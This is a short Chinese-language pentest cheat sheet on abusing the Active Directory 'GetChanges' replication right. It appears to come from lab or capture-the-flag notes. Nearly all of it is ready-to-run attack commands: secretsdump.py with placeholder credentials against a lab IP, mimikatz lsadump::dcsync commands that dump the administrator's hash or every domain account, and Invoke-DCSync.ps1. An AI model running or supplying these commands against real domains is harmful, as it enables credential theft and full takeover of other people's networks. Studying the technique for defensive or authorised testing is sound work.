# GetChanges

进行DCSync攻击，可以拿到所有hash，也可以执行拿admin

```clike
	脚本转储
secretsdump.py '【账户】:【密码】@10.10.10.175'
	mimikatz获取
（1.仅admin用户）.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
（2.获取全部）mimikatz.exe privilege::debug "lsadump::dcsync /domain:Mikasa.com /all /csv" exit
	ps1脚本
Import-Module .\Invoke-DCSync.ps1
Invoke-DCSync -PWDumpFormat
```
